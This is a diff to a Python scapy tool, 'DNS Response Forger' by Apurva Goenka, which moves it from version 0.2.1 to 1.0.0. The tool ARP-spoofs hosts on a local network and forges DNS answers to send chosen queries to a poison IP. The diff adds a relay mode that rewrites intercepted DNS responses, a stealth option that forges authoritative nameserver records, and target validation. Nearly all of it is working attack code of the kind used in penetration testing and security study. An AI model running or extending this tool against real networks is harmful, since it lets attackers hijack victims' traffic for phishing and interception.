@@ -16,7 +16,6 @@
 
 import argparse
 import ipaddress
-import logging as log
 import os
 import socket
 import sys
@@ -41,6 +40,7 @@ from scapy.all import (
 from termcolor import colored
 
 from .attack_state import AttackState as state
+from .logger import *
 
 
 def banner():
@@ -54,7 +54,7 @@ def banner():
 |______.'|_____|\____| \______.'|_____|  '.__.' [___]   .',__`  '.__.' 
                                                        ( ( __))        
 Author : Apurva Goenka
-Version : 0.2.1
+Version : 1.0.0
     """
     )
 
@@ -67,18 +67,14 @@ def req_dns_soa():
         / DNS(rd=1, qd=DNSQR(qname=args.domain, qtype="AAAA"))
     )
     # Send DNS request to request SOA
-    log.info(
-        colored("[*] Requesting SOA record from authoritative DNS server", "green")
-    )
+    log_info("[*] Requesting SOA record from authoritative DNS server", "yellow")
     received = sr1(dns_request, verbose=0)
     if received and DNS in received and received[DNS].nscount > 0:
-        log.info(colored("[+] Captured Authoritative Nameserver Signature", "yellow"))
-        log.debug(received[DNSRRSOA].show(dump=True))
+        log_info("[+] Captured Authoritative Nameserver Signature")
+        log_debug(received[DNSRRSOA].show(dump=True))
         return received[DNSRRSOA]
     else:
-        log.error(
-            colored("[!] Failed to capture Authoritative Nameserver Signature", "red")
-        )
+        log_error("[!] Failed to capture Authoritative Nameserver Signature")
         return
 
 
@@ -94,21 +90,39 @@ def arp_request(net_interface, target_ip):
         return
 
 
-def arp_spoof(net_interface, target_ip):
+def backup_arp(net_interface, target_ip):
     # Backup original ARP cache
     orig_hwdst = arp_request(net_interface, target_ip)
-    if orig_hwdst:
-        log.info(
-            colored(f"[*] Backed up ARP cache for {target_ip} - {orig_hwdst}", "green")
+    if not orig_hwdst:
+        resp = (
+            input(
+                colored(
+                    f"[!] The ARP spoofing target {target_ip} isn't responding to ARP requests and therefore may be unreachable - continue anyway? (Y/n): ",
+                    "yellow",
+                )
+            )
+            .strip()
+            .lower()
         )
+        if resp not in ["y", ""]:
+            log_info(f"[-] Removing {target_ip} from ARP spoofing targets", "yellow")
+            return False
+        else:
+            return True
+    else:
+        log_info(f"[*] Backed up ARP cache for {target_ip} - {orig_hwdst}")
         state.set_arp_cache(target_ip, orig_hwdst)
+        return True
+
+
+def arp_spoof(net_interface, target_ip):
     spoof_hwdst = netifaces.ifaddresses(str(net_interface))[netifaces.AF_LINK][0][
         "addr"
     ]
     spoof_packet = Ether(src=spoof_hwdst, dst="ff:ff:ff:ff:ff:ff") / ARP(
         op=2, hwsrc=spoof_hwdst, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"
     )
-    log.info(colored(f"[*] Spoofing ARP: {target_ip} is at {spoof_hwdst}", "green"))
+    log_info(f"[*] Spoofing ARP: {target_ip} is at {spoof_hwdst}", "yellow")
     # Continuously spoof ARP until process is killed
     sendp(spoof_packet, iface=net_interface, verbose=0, loop=1, inter=1)
 
@@ -123,13 +137,17 @@ def arp_restore(net_interface, target_ip):
         hwdst="ff:ff:ff:ff:ff:ff",
     )
     sendp(restore_packet, iface=net_interface, verbose=0)
-    log.info(colored(f"[*] Restored ARP cache for {target_ip} - {cached_hw}", "green"))
+    log_info(f"[*] Restored ARP cache for {target_ip} - {cached_hw}")
 
 
 def dns_forge(packet, args):
-    net_interface = args.interface
-    query_filter = args.query_name
-    ttl = args.time_to_live
+    if args.mode == "respond":
+        dns_forge_respond(packet, args)
+    elif args.mode == "relay":
+        dns_forge_relay(packet, args)
+
+
+def dns_forge_respond(packet, args):
     dns_nxdomain = False
 
     # Ignore packet if no DNS query present
@@ -148,24 +166,22 @@ def dns_forge(packet, args):
         arcount=0,
     )
 
-    log.info(colored(f"[*] Found DNS request from {packet[IP].src}", "yellow"))
+    log_info(f"[*] Found DNS request from {packet[IP].src}")
     query = packet[DNSQR].qname.decode("utf-8")
-    if query_filter and not any(q in query for q in query_filter):
-        log.info(
-            f"[-] Query: {query} does not match filter - responding with correct IP"
+    if args.query_name and not any(q in query for q in args.query_name):
+        log_info(
+            f"[-] Query: {query} does not match filter - responding with correct IP",
+            "yellow",
         )
 
         if query not in state.get_dns_cache():
-            log.debug(colored(f"[*] Resolving query {query}", "green"))
+            log_debug(f"[*] Resolving query {query}")
 
             try:
                 dns_lookup = socket.gethostbyname(query)
             except socket.gaierror:
-                log.error(
-                    colored(
-                        f"[!] Cannot resolve query {query} - responding with NXDomain",
-                        "red",
-                    )
+                log_error(
+                    f"[!] Cannot resolve query {query} - responding with NXDomain"
                 )
                 # Modify base packet
                 dns_layer.rcode = 3
@@ -176,23 +192,21 @@ def dns_forge(packet, args):
                 # Cache IP for future requests
                 state.set_dns_cache(query, dns_lookup)
         else:
-            log.debug(colored(f"[*] DNS cache hit for {query}", "green"))
+            log_debug(f"[*] DNS cache hit for {query}", "green")
             resp_ip = state.get_dns_cache()[query]
         if not dns_nxdomain:
-            log.info(
-                colored(f"[*] Responding to query {query} with IP {resp_ip}", "green")
-            )
+            log_info(f"[*] Responding to query {query} with IP {resp_ip}", "yellow")
         else:
-            log.info(colored(f"[*] Responding to query {query} with NXDomain", "green"))
+            log_info(f"[*] Responding to query {query} with NXDomain", "yellow")
     else:
         resp_ip = args.poison_ip
-        log.info(colored(f"[*] Poisoning query {query} with IP {resp_ip}", "green"))
+        log_info(f"[*] Poisoning query {query} with IP {resp_ip}")
 
     if not dns_nxdomain:
         dns_layer.rcode = 0
         dns_layer.ancount = 1
         dns_layer.an = DNSRR(
-            rrname=packet[DNS].qd.qname, type="A", ttl=ttl, rdata=resp_ip
+            rrname=packet[DNS].qd.qname, type="A", ttl=args.time_to_live, rdata=resp_ip
         )
 
     response_packet = (
@@ -203,15 +217,79 @@ def dns_forge(packet, args):
     )
 
     # Modify packet if stealth mode enabled
-    if state.get_authoritative_nameservers() and args.stealth:
-        log.info(colored(f"[+] Forged Authoritative Nameserver Signature", "yellow"))
+    if state.get_authoritative_nameserver() and args.stealth:
+        log_info(f"[+] Forged Authoritative Nameserver Signature")
         response_packet[DNS].nscount = 1
-        response_packet[DNS].ns = state.get_authoritative_nameservers()
+        response_packet[DNS].ns = state.get_authoritative_nameserver()
 
     # Send the DNS response
-    sendp(response_packet, iface=net_interface, verbose=False)
-    log.info(colored(f"[+] Sent Forged/Poisoned Packet to {packet[IP].src}", "yellow"))
-    log.debug(response_packet[DNS].show(dump=True))
+    sendp(response_packet, iface=args.interface, verbose=False)
+    log_info(f"[+] Sent Forged/Poisoned Packet to {packet[IP].src}")
+    log_debug(response_packet[DNS].show(dump=True))
+
+
+def dns_forge_relay(packet, args):
+    resp_ip = args.poison_ip
+    # Ignore previously seen DNS packets
+    if bytes(packet) in state.get_dns_cache():
+        log_debug(f"[-] Found duplicate packet to {packet[IP].dst} - ignoring.")
+        return
+
+    # Ignore packets to client IPs outside target range
+    if packet[IP].dst not in state.get_arp_cache():
+        log_error(
+            f"[!] Found packet to IP {packet[IP].dst} outside target range - ignoring."
+        )
+        return
+
+    log_info(f"[*] Found DNS response to {packet[IP].dst}")
+    query = packet[DNS].qd.qname.decode("utf-8")
+    if args.query_name and not any(q in query for q in args.query_name):
+        log_info(
+            f"[-] Query: {query} does not match filter - forwarding original packet",
+            "yellow",
+        )
+        dns_layer = packet[DNS]
+    else:
+        log_info(f"[*] Poisoning query {query} with IP {resp_ip}")
+        dns_layer = DNS(
+            id=packet[DNS].id,
+            qd=packet[DNS].qd,
+            aa=0,
+            rd=1,
+            qr=1,
+            rcode=0,
+            qdcount=1,
+            ancount=1,
+            nscount=0,
+            arcount=0,
+            an=DNSRR(
+                rrname=packet[DNS].qd.qname,
+                type="A",
+                ttl=args.time_to_live,
+                rdata=resp_ip,
+            ),
+        )
+
+    cached_hw = state.get_arp_cache()[packet[IP].dst]
+    response_packet = (
+        Ether(src=packet[Ether].dst, dst=cached_hw)
+        / IP(src=packet[IP].src, dst=packet[IP].dst)
+        / UDP(dport=packet[UDP].dport, sport=packet[UDP].sport)
+        / dns_layer
+    )
+
+    # Modify packet if stealth mode enabled
+    if state.get_authoritative_nameserver() and args.stealth:
+        log_info(f"[+] Forged Authoritative Nameserver Signature")
+        response_packet[DNS].nscount = 1
+        response_packet[DNS].ns = state.get_authoritative_nameserver()
+
+    # Send the DNS response
+    sendp(response_packet, iface=args.interface, verbose=False)
+    log_info(f"[+] Sent Forged/Poisoned Packet to {response_packet[IP].dst}")
+    state.set_dns_cache(bytes(response_packet), response_packet[IP].dst)
+    log_debug(response_packet[DNS].show(dump=True))
 
 
 def validate_arp_spoof_targets(arp_target, net_interface):
@@ -227,11 +305,8 @@ def validate_arp_spoof_targets(arp_target, net_interface):
                 gateway = gw_ip
                 break
         if not gateway:
-            log.error(
-                colored(
-                    f"[!] Cannot find gateway for interface {net_interface} - exiting..",
-                    "red",
-                )
+            log_error(
+                f"[!] Cannot find gateway for interface {net_interface} - exiting.."
             )
             sys.exit(1)
 
@@ -239,18 +314,16 @@ def validate_arp_spoof_targets(arp_target, net_interface):
         valid_arp_target = set()
         for target in arp_target:
             if ipaddress.IPv4Address(target) not in subnet:
-                log.info(
-                    colored(
-                        f"[*] Target {target} is not within the same subnet - targeting gateway {gateway} instead",
-                        "green",
-                    )
+                log_info(
+                    f"[*] Target {target} is not within the same subnet - targeting gateway {gateway} instead",
+                    "yellow",
                 )
                 # check IP forwarding before proceeding
                 if not check_ip_forwarding():
                     resp = (
                         input(
                             colored(
-                                "[*] The subnet gateway is targeted for ARP spoofing but IP forwarding isn't detected - continue anyway? (Y/n): ",
+                                "[!] The subnet gateway is targeted for ARP spoofing but IP forwarding isn't detected - continue anyway? (Y/n): ",
                                 "yellow",
                             )
                         )
@@ -258,17 +331,21 @@ def validate_arp_spoof_targets(arp_target, net_interface):
                         .lower()
                     )
                     if resp not in ["y", ""]:
-                        log.error(
-                            colored(
-                                "[!] Removing gateway from ARP spoofing targets",
-                                "red",
-                            )
+                        log_info(
+                            "[-] Removing gateway from ARP spoofing targets", "yellow"
                         )
                         continue
                 valid_arp_target.add(gateway)
             else:
                 valid_arp_target.add(target)
-        return valid_arp_target
+
+        backed_arp_target = set()
+        # Attempt ARP backup
+        for target in valid_arp_target:
+            result = backup_arp(net_interface, target)
+            if result:
+                backed_arp_target.add(target)
+        return backed_arp_target
 
 
 def check_ip_forwarding():
@@ -285,6 +362,13 @@ def parse_args():
     # Parse Arguments
     parser = argparse.ArgumentParser(
         description="DNS Response Forger",
+    )
+    parser.add_argument(
+        "mode",
+        choices=["respond", "relay"],
+        action="store",
+        help="Respond mode: DNS request packets are intercepted on their way from the client to the server.\n"
+        "Relay mode: DNS response packets are intercepted on their way from the server to the client.",
     )
     parser.add_argument(
         "-i",
@@ -353,14 +437,11 @@ def main():
     args = parse_args()
 
     # Setup Logging
-    if args.verbose:
-        log.basicConfig(format="%(message)s", level=log.DEBUG)
-    else:
-        log.basicConfig(format="%(message)s", level=log.INFO)
+    setup_logging(args.verbose)
 
     # Check root privileges
     if os.geteuid() != 0:
-        log.error(colored("[!] Please run as root", "red"))
+        log_error("[!] Please run as root")
         sys.exit(1)
 
     # Check network interface
@@ -368,39 +449,40 @@ def main():
         if netifaces.AF_INET in netifaces.ifaddresses(args.interface):
             net_interface = args.interface
     except ValueError:
-        log.error(colored("[!] Invalid network interface supplied", "red"))
+        log_error("[!] Invalid network interface supplied")
         sys.exit(1)
 
     # Stealth mode
     if args.stealth:
-        log.info(colored("[*] Stealth mode activated", "green"))
-        log.debug(
-            colored("[*] Capturing Authoritative Nameserver Signature...", "green")
-        )
-        authoritative_nameservers = req_dns_soa()
-        state.set_authoritative_nameservers(authoritative_nameservers)
+        log_info("[*] Stealth mode activated")
+        log_debug("[*] Capturing Authoritative Nameserver Signature...")
+        authoritative_nameserver = req_dns_soa()
+        state.set_authoritative_nameserver(authoritative_nameserver)
 
     # Check ARP spoofing targets
     if args.target:
+        try:
+            ipaddress.IPv4Address(args.target)
+        except ipaddress.AddressValueError:
+            log_error(f"[!] Invalid ARP spoofing target supplied: {args.target}")
+            sys.exit(1)
         arp_target = [args.target]
     elif args.target_file:
         if os.path.exists(args.target_file):
             with open(args.target_file, "r") as tf:
                 arp_target = [target.strip() for target in tf.readlines()]
         else:
-            log.error(
-                colored(f"[!] Invalid targets file supplied: {args.target_file}", "red")
-            )
+            log_error(f"[!] Invalid targets file supplied: {args.target_file}")
             sys.exit(1)
 
-    arp_target = validate_arp_spoof_targets(arp_target, net_interface)
-    if not arp_target:
-        log.error(colored("[!] ARP spoofing targets missing - exiting..", "red"))
+    state.set_arp_target(validate_arp_spoof_targets(arp_target, net_interface))
+    if not state.get_arp_target():
+        log_error("[!] ARP spoofing targets missing - exiting..")
         sys.exit(1)
 
     # Setup ARP spoofing
     if not args.no_arp_spoof:
-        for target in arp_target:
+        for target in state.get_arp_target():
             arpspoof_thread = threading.Thread(
                 target=arp_spoof,
                 args=(
@@ -411,32 +493,41 @@ def main():
             arpspoof_thread.daemon = True
             arpspoof_thread.start()
 
-    # Setup DNS Forging/Poisoning
+    # Setup DNS Forging/Poisoning based on attack mode
     iface_ip = netifaces.ifaddresses(net_interface)[netifaces.AF_INET][0]["addr"]
-    dns_req_packet_filter = " and ".join(
-        ["udp dst port 53", "udp[10] & 0x80 = 0", f"not src host {iface_ip}"]
-    )
-    log.info(colored("[*] Forging/Poisoning DNS responses", "green"))
+
+    if args.mode == "respond":
+        dns_packet_filter = " and ".join(
+            ["udp port 53", "udp[10] & 0x80 = 0", f"not src host {iface_ip}"]
+        )
+        log_info(
+            "[*] Respond mode - intercepting DNS requests from victim clients to DNS server",
+            "yellow",
+        )
+    elif args.mode == "relay":
+        dns_packet_filter = " and ".join(
+            ["udp port 53", "udp[10] & 0x80 != 0", f"not dst host {iface_ip}"]
+        )
+        log_info(
+            "[*] Relay mode - intercepting DNS responses from DNS server to victim clients",
+            "yellow",
+        )
+
     if args.query_name:
         args.query_name = args.query_name.split(",")
-        log.info(colored(f"[*] Filtering DNS requests for {args.query_name}", "green"))
+        log_info(f"[*] Filtering DNS requests for {args.query_name}", "yellow")
     else:
-        log.info(
-            colored(
-                "[*] No query filter supplied - responding to all DNS requests",
-                "yellow",
-            )
-        )
+        log_info("[*] No query filter supplied - poisoning all DNS packets", "yellow")
     sniff(
-        filter=dns_req_packet_filter,
+        filter=dns_packet_filter,
         prn=lambda packet: dns_forge(packet, args),
         store=0,
         iface=net_interface,
     )
-    log.info(colored("[!] Ctrl-C detected, killing..", "red"))
+    log_info("[!] Ctrl-C detected, killing..", "red")
     if not args.no_arp_spoof:
-        log.info(colored("[*] Re-arping targets", "green"))
-        for target in arp_target:
+        log_info("[*] Re-arping targets", "yellow")
+        for target in state.get_arp_target():
             if target in state.get_arp_cache():
                 arp_restore(net_interface, target)
 
